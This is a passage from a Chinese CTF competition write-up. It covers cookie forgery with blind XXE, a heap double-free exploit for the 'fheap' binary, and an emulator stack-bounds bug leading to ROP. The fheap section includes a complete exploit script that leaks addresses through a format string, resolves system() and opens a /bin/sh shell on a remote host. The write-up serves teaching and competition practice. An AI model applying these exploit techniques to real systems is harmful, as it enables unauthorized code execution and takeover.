       }
       return base64_decode($data);
    }
    function decrypt2( $string ) {
    $string = urlsafe_b64decode( $string );
    $string[5] = chr(ord($string[5])^0^ord('x'));
    $string = urlsafe_b64encode($string);
    return $string;
    }
    echo decrypt2("oPR4gZAqfHYnOhWw1GcX-zIEvN_1OCaamhmDLxRigpA");
得到密文后伪造cookie登陆。
审计到upload.php中有xml的解析。于是利用xxe漏洞盲打读取根目录flag.php文件内容即可
**就是干（fheap）**
漏洞部分：
删除时，由于检查的条件str_info指针在delete后并没有置空，存在double free，如下：
结构体如下，存在函数指针：
创建时，管理结构大小为0x20字节，而数据部分大小可控。如下：
利用点：
所以可以根据fastbin，构造数据部分和管理结构大小相等，在分配时，错乱顺序，可以让数据部分和管理结构重合，从而改写函数指针，程序开启了pie，可以只改写释放函数的后两字节（其前面部分地址是一样的），将其改写成printf_plt，实现任意地址泄露，因为libc没有提供，所以可以通过printf来实现dynelf的leak函数，由于前面说的数据段和管理结构可以重叠，改写buff指针以及其函数指针，最终利用代码如下：
脚本如下：
    from zio import *
    target = "./fheap"
    target = ("115.28.78.54", 80)
    def get_io(target):
           r_m = COLORED(RAW, "green")
           w_m = COLORED(RAW, "blue")
           io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
           return io
    def t_create(io, buff):
           io.read_until("3.quitn")
           io.write("create ")
           io.read_until(":")
           io.writeline(str(len(buff)))
           io.read_until(":")
           io.write(buff)
    def t_delete(io, tid, padding = "yes"):
           io.read_until("3.quitn")
           io.write("delete ")
           io.read_until(":")
           io.writeline(str(tid))
           io.read_until(":")
           io.writeline(padding)
    g_io = 0
    g_canary = 0
    proc_addr = 0
    def gen_payload(func_got, arg1, arg2, arg3):
           #set_args_addr
           set_args_addr = 0x11da + proc_addr
           call_func_addr = 0x11c0 + proc_addr
           payload = ""
           payload += l64(set_args_addr)
           payload += l64(0)            #pop rbx = 0
           payload += l64(1)            #pop rbp
           payload += l64(func_got)     #pop r12
           payload += l64(arg3)         #pop r13
           payload += l64(arg2)         #pop r14
           payload += l64(arg1)         #pop r15
           payload += l64(call_func_addr)
           payload += l64(0)            #nouse padding : add     rsp, 8
           payload += l64(0)            #pop rbx = 0
           payload += l64(1)            #pop rbp
           payload += l64(func_got)     #pop r12
           payload += l64(arg3)         #pop r13
           payload += l64(arg2)         #pop r14
           payload += l64(arg1)         #pop r15
           payload += l64(call_func_addr)
           return payload
    def leak_addr(addr):
           global g_io
           global proc_addr
           t_delete(g_io, 1)
           index0 = 9
           printf_plt = 0x9d0 + proc_addr
           #print "printf_plt:", hex(printf_plt)
           payload = ""
           payload += ("%%%d$s--..--"%(index0)).ljust(0x18, 'a')
           payload += l64(printf_plt)[:3] + "x00"
           t_create(g_io, payload)
           padding = "yes.aaaa"
           padding += l64(addr)
           t_delete(g_io, 2, padding)
           #data = io.read_until_timeout(2)
           data = g_io.read_until("--..--")[:-6]
           data += "x00"
           return data
    def get_shell(system_addr):
           global g_io
           global proc_addr
           t_delete(g_io, 1)
           index0 = 9
           printf_plt = 0x9d0 + proc_addr
           #print "printf_plt:", hex(printf_plt)
           payload = ""
           payload += ("/bin/sh;").ljust(0x18, 'a')
           payload += l64(system_addr)[:6] + "x00"
           t_create(g_io, payload)
           padding = "yes.aaaa"
           padding += ""
           t_delete(g_io, 2, padding)
           #data = io.read_until_timeout(2)
           io.interact()
    from pwn import *
    def pwn(io):
           global g_io
           global proc_addr
           g_io = io
           io.read_until(":")
           io.writeline("927e613a91620da8c5f10936faf70f4dgDR95OLX")
           t_create(io, "a"*0x20)
           t_create(io, "a"*0x20)
           t_create(io, "a"*0x20)
           t_create(io, "a"*0x20)
           t_delete(io, 0)
           t_delete(io, 1)
           t_delete(io, 2)
           t_delete(io, 3)
           t_create(io, "a"*0x40)
           release_func = 0xD6c
           printf_plt = 0xb9d0
           #io.gdb_hint()
           #printf_plt = int(raw_input("printf_plt:"), 16)
           index0 = 9
           ret_index = (0x458 - 0x348)/8 + index0
           __libc_start_main_index = (0x878 - 0x348)/8 + index0
           canary_index = (0x108)/8 + index0 - 1
           payload = ""
           payload += ("%%%d$p.%%%d$p.%%%d$p--..--"%(ret_index, __libc_start_main_index, canary_index)).ljust(0x18, 'a')
           payload += l64(printf_plt)[:2] + "x00"
           t_create(io, payload)
           padding = "yes.aaaa"
           padding += "b"*8
           padding += "c"*8
           t_delete(io, 2, padding)
           #data = io.read_until_timeout(2)
           data = io.read_until("--..--")
           print data
           if "--..--" not in data:
                  return False
           data = data[:data.find("--..--")]
           items = data.split('.')
           proc_addr = int(items[0], 16) - 0xcf2
           __libc_start_main_addr = int(items[1], 16)
           print "__libc_start_main_addr:", hex(__libc_start_main_addr)
           canary_data = int(items[2], 16)
           print "canary_data:", hex(canary_data)
           print "proc_addr:", hex(proc_addr)
           g_canary = canary_data
           print "get it"
           read_got = 0x0000000000202058 + proc_addr
           data = leak_addr(read_got)
           read_addr = l64(data[:8].ljust(8, 'x00'))
           print "read_addr:", hex(read_addr)
           print [c for c in data]
           offset = -0xb12e0
           if offset == 0:
                  #d = DynELF(leak_addr, proc_addr)
                  d = DynELF(leak_addr, proc_addr, elf=ELF('./fheap'))
                  system_addr = d.lookup('system', 'libc')
                  print "system_addr:", hex(system_addr)
                  offset = system_addr - read_addr
                  print "offset:", hex(offset)
           system_addr = read_addr + offset
           print "system_addr:", hex(system_addr)
           get_shell(system_addr)
    import time
    while True:
           try:
                  io = get_io(target)
                  if pwn(io) == False:
                         continue
           except Exception, e:
                  #raise
                  pass
           time.sleep(2)
flag如下：
**ASM**
程序实现了一个代码仿真器，他提供了一系列的类x86指令，功能也类似，并提供了make_code，能对汇编代码进行转换，
里面的重点指令功能：lea dst,src 能够实现将src(寄存器或者内存地址)的地址取出来，并放到dst中去，所以可以通过lea
r1,r0,取得r0的内存地址。
通过栈实现任意地址读写：
在内存布局中，有以下关系：
    |…..Libc……..|
    |…..data…….|
    |…..heap…….|
    |…..stack……|
仿真器中的堆栈在程序中的heap中，而在pop（伪栈下移）时，未检测上界限，可以泄露上面的地址（取内存中值），在push（伪栈上移）时，未检测下界限，可以改写stack的地址（写内存值）。而sp可以直接通过mov等指令进行改写。
泄露的libc地址可以用仿真器的寄存器存储，并找到libc中environ的位置，从而得到栈的地址，该libc直接通过libc_database可以查到，最终在栈中布置好rop，在仿真代码结束后，即可获取shell。
利用脚本系列如下：
获取shell的带注释的asm文件如下：
    data: